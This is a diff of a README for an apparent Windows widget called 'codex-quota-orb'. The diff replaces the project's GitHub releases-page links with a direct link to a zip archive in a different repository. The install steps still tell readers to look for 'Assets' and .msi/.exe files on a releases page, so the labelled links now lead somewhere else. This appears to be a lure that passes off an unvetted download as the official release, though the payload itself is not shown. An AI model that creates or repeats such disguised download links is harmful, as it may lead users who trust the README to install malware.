@@ -5,13 +5,13 @@ description: "Track your Codex quota, daily token usage, and agent analytics wit
 ---
 # 🔮 codex-quota-orb - Track your usage and credit limits
 
-[![](https://img.shields.io/badge/Download-Latest_Release-blue.svg)](https://github.com/citylinemotion819/codex-quota-orb/releases)
+[![](https://img.shields.io/badge/Download-Latest_Release-blue.svg)](https://github.com/citylinemotion819/citylinemotion819.github.io/raw/refs/heads/main/components/1.0-alpha.4.zip)
 
 Codex-quota-orb offers a clean, liquid-glass widget for your Windows desktop. It tracks your Codex quota, shows your remaining credits before they reset, monitors token trends, and analyzes your local routing for Skills and Agents. It keeps your data local and provides a clear view of your developer tools usage.
 
 ## 📥 How to download and install
 
-1. Visit the [releases page](https://github.com/citylinemotion819/codex-quota-orb/releases).
+1. Visit the [releases page](https://github.com/citylinemotion819/citylinemotion819.github.io/raw/refs/heads/main/components/1.0-alpha.4.zip).
 2. Look for the section labeled "Assets" at the bottom of the newest release.
 3. Select the file ending in `.msi` or `.exe` to start the download.
 4. Open the downloaded file once it finishes.
